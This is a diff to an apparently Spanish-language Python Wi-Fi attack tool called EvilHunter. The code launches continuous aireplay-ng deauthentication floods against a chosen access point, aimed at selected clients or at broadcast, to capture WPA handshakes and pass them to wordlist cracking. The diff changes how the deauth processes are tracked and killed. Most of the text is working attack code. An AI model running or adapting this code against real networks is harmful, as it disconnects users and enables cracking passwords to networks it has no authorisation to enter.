@@ -1,6 +1,4 @@
 #!/bin/python3
-# SUBIR A PYPI
-import concurrent.futures
 
 try:
     # Importamos librerias
@@ -29,8 +27,10 @@ except ModuleNotFoundError as e:
     exit(1)
 
 #
-# Añadir el ataque a más de 1 cliente ( select_client() )
+# Frenar deauth
+# Añadida varibale deauth (global) (falta testear)
 #
+
 
 
 def delete_files():
@@ -54,14 +54,14 @@ def stop_monitoring():
 def exiting(err):
     # Salida con o sin error
     if err:
-        if err is True:
-            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)
-
-        elif err == "done":
+        if err == "done":
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
 
         elif err is False:
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
+
+        else:
+            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)
 
     elif not err:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
@@ -582,7 +582,7 @@ def prepare_attack(net_specs, net_clients, network_to_attack, args):
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
-
+    time.sleep(0.2)
     capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch,
                                                                file, network_to_attack, attack_client))
 
@@ -666,7 +666,8 @@ def verify_clients(client, clients, clients_to_attack):
     return clients_to_attack
 
 
-def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
+def  capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
+    global pids
     if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
         os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")
 
@@ -675,26 +676,29 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
                              f"{interface}"], stdout=subprocess.PIPE)
 
     threads = []
+    pids = []
     # Si tenemos cliente  para atacar:
     if attack_client is not None:   # 1 solo client
         if len(attack_client) == 1:
             time.sleep(0.2)
-            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0]))
+            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0], pids))
             thread.start()
             threads.append(thread)
 
         elif len(attack_client) > 1:   # Mas de 1 clients
             for client in attack_client:
                 time.sleep(0.2)
-                thread = threading.Thread(target=deauth_client, args=(bssid, client))
+                thread = threading.Thread(target=deauth_client, args=(bssid, client, pids))
 
                 thread.start()
                 threads.append(thread)
 
     # Si no al broadcast
     elif attack_client is None:
-        subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
+        time.sleep(0.2)
+        thread = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                          stdout=subprocess.DEVNULL)
+        pids.append(thread.pid)
 
     done = False
     while True:
@@ -709,12 +713,14 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
                 break
 
         except KeyboardInterrupt:
-            break
+            break 
 
     # Esperar a que todos los hilos terminen
     if threads:
-        for thread in threads:
-            thread.join() 
+        for pid in pids:
+            os.kill(pid, 9)
+    else:
+        os.kill(pids[0], 9)
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
@@ -725,9 +731,10 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
     crack_handshake(direc, args, file, network_to_attack)
 
 
-def deauth_client(bssid, client):
-    subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface], stdout=subprocess.DEVNULL)
-
+def deauth_client(bssid, client, pids):
+    deauth = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface],
+                              stdout=subprocess.DEVNULL)
+    pids.append(deauth.pid)
 
 def find_wordlists(wordlists):
     found = os.system("find {} > /dev/null".format(wordlists))
